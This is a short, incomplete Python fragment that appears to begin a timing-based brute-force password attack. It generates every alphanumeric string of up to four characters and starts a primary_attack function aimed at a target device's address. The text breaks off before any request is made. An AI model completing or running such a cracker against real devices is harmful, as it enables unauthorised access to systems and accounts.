import requests
import time

from string import digits, ascii_uppercase, ascii_lowercase
from itertools import product

chars = digits + ascii_uppercase + ascii_lowercase

def password_generator(digits):
    for n in range(1, 4 + 1):
        for comb in product(chars, repeat=n):
            yield(''.join(comb))

def primary_attack(address, digits, resultname):
    """ address = address of the target device
        start_str = where the attack string id begins
        resultname = how should the results be named
    """
    passwords = password_generator(digits)
    for password in passwords:
        start = time.perf_counter()
